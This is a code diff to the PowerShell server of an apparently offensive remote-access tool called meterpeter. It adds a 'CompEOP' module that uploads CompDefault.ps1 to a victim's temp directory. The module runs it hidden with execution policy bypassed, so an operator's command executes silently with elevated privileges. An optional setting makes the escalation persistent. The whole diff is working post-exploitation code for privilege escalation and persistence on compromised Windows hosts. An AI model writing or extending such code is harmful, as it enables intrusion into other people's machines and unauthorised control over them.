@@ -920,12 +920,67 @@ While($Client.Connected)
         write-host "   and put meterpeter in listenner mode to be abble to catch the connection.";
         write-host "`n`n   Modules     Description                  Remark" -ForegroundColor green;
         write-host "   -------     -----------                  ------";
+        write-host "   CompEOP     Execute 1 command as admin   Client:User  - Privileges required";
         write-host "   SluiEOP     Execute 1 command as admin   Client:User  - Privileges required";
         write-host "   getsystem   Escalate Client Privileges   Client:User  - Privileges required";
         write-host "   Delete      Delete Priv Escal settings   Client:User  - Privileges required";
         write-host "   Return      Return to Server Main Menu" -ForeGroundColor yellow;
         write-host "`n`n :meterpeter:Post:Escalate> " -NoNewline -ForeGroundColor Green;
         $Escal_choise = Read-Host;
+
+        If($Escal_choise -eq "CompEOP" -or $Escal_choise -eq "compeop")
+        {
+           $name = "CompDefault.ps1";
+           $File = "$Bin$name"
+           If(([System.IO.File]::Exists("$File")))
+           {
+              write-host " - Input Command: " -NoNewline;
+              $mYcOMMAND = Read-Host
+              ## Make the command persistence
+              write-host " - MakeItPersistence (True/False): " -NoNewline;
+              $PersisteMe = Read-Host
+              If(-not($PersisteMe) -or $PersisteMe -eq $null){$PersisteMe = "False"}
+              If($PersisteMe -eq "True"){
+                 cd mimiRatz
+                 $CheckValue = Get-Content CompDefault.ps1|Select-String "MakeItPersistence ="
+                 If($CheckValue -match 'False'){
+                    ((Get-Content -Path CompDefault.ps1 -Raw) -Replace "MakeItPersistence = `"False`"","MakeItPersistence = `"True`"")|Set-Content -Path CompDefault.ps1 -Force
+                 }
+                 cd ..
+              }
+              write-host "`n   EOP Module Remark" -ForegroundColor Yellow;
+              write-host "   -----------------";
+              write-host "   This module uploads CompDefault.ps1 script to `$env:TMP dir and executes";
+              write-host "   EOP to be abble to silent execute our command with higth privileges.";
+              If($PersisteMe -eq "True"){
+                 write-host "`n   If 'MakeItPersistence' its activated (True) then CompDefault will NOT";
+                 write-host "   Delete the EOP, making the 'command' available everytime we execute";
+                 write-host "   powershell Start-Process `"C:\Windows\System32\ComputerDefaults.exe`""
+                 write-host "   Remark: .\CompDefault.ps1 `"deleteEOP`" argument deletes the persistence" -ForeGroundColor yellow;
+              }
+
+              If(-not($mYcOMMAND) -or $mYcOMMAND -eq $null){$mYcOMMAND = "$env:WINDIR\System32\cmd.exe"}
+              ## Write Local script (CompDefault.ps1) to Remote-Host $env:tmp
+              $FileBytes = [io.file]::ReadAllBytes("$File") -join ',';
+              $FileBytes = "($FileBytes)";
+              $File = $File.Split('\')[-1];
+              $File = $File.Split('/')[-1];
+              $Command = "`$1=`"`$env:tmp\#`";`$2=@;If(!([System.IO.File]::Exists(`"`$1`"))){[System.IO.File]::WriteAllBytes(`"`$1`",`$2);`"`$1`"};powershell.exe -exec bypass -w 1 -File `"`$env:TMP\CompDefault.ps1`" `"$mYcOMMAND`""
+              $Command = $Command -replace "#","$File";
+              $Command = $Command -replace "@","$FileBytes";
+              $Upload = $True;
+              $COMEOP = "True"
+           }else{
+              ## Local File { CompDefault.ps1 } not found .
+              Write-Host "`n`n   Status     Local Path" -ForeGroundColor green;
+              Write-Host "   ------     ----------";
+              Write-Host "   Not Found  $File" -ForeGroundColor red;
+              $File = $Null;
+              $Command = $Null;
+              $Upload = $False; 
+           }
+        }
+
         If($Escal_choise -eq "SluiEOP" -or $Escal_choise -eq "slui")
         {
            $name = "SluiEOP.ps1";
@@ -2050,6 +2105,20 @@ While($Client.Connected)
             write-host "   ------   -----------"
             Write-Host "   Saved    $OutPut"
             $SluiEOP = "False"
+
+         }ElseIf($COMEOP -eq "True"){
+
+            cd mimiRatz
+            ## Revert CompDefault [<MakeItPersistence>] to defalt [<False>]
+            $CheckValue = Get-Content CompDefault.ps1|Select-String "MakeItPersistence ="
+            If($CheckValue -match 'True'){((Get-Content -Path CompDefault.ps1 -Raw) -Replace "MakeItPersistence = `"True`"","MakeItPersistence = `"False`"")|Set-Content -Path CompDefault.ps1 -Force}
+            cd ..
+
+            Write-Host "`n`n   Status   Remote Path" -ForeGroundColor green;
+            write-host "   ------   -----------"
+            Write-Host "   Saved    $OutPut"
+            $COMEOP = "False"
+
           }else{
             $OutPut = $OutPut -replace "`n","";
             If($OutPut -match "GetBrowsers.ps1"){
